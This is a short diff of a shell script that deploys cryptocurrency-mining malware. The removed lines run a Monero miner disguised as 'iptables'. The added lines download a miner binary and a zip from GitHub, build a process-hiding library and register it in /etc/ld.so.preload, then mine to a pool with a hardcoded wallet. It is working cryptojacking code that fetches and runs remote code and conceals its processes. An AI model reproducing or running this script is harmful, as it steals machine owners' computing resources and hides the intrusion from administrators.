@@ -1,2 +1,15 @@
-chmod 777 iptables
-nohup ./iptables -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u 3DMucgPZzjUp9MwUMDJ9kn1jRwYBYocY3w.$(echo $(shuf -i 1-999 -n 1)) -p x -k -a rx/0 --cpu-max-threads-hint=75
+#!/bin/sh
+
+
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./bezzHash --url=TKayEe5GHQniDgdkVwJy6FEnH1cnyQbLRS@ethash.mine.zergpool.com:9999 --pass c=TRX --coolui
